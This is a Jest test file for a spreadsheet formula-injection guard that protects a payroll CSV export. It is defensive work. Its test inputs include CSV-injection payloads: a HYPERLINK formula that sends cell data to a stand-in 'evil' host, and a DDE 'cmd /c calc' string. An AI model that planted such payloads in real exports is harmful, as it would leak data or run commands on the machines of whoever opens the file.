import { buildCsv } from "../../modules/payroll/insights/lib/csv";
import { neutralizeSpreadsheetFormula, safeCsvCell } from "./spreadsheet-cell";

describe("spreadsheet formula guard", () => {
  it.each(["=HYPERLINK(\"https://evil/?\"&A1)", "+1+1", "-cmd|' /c calc'!A1", "@SUM(A1)", "\t=1", "\r=1"])(
    "turns %p into text",
    (payload) => expect(neutralizeSpreadsheetFormula(payload)).toBe(`'${payload}`),
  );

  it("leaves plain and negative numbers alone", () => {
    expect(neutralizeSpreadsheetFormula("-1200.00")).toBe("-1200.00");
    expect(neutralizeSpreadsheetFormula("42")).toBe("42");
    expect(neutralizeSpreadsheetFormula("Asha Rao")).toBe("Asha Rao");
  });

  it("quotes and guards one cell", () => {
    expect(safeCsvCell('=x"y')).toBe(`"'=x""y"`);
    expect(safeCsvCell(null)).toBe('""');
  });

  it("guards the payroll report builder", () => {
    expect(buildCsv(["Name", "Net"], [["=HYPERLINK(\"x\")", "-5.00"]])).toBe(
      `Name,Net\n"'=HYPERLINK(""x"")",-5.00`,
    );
  });
});
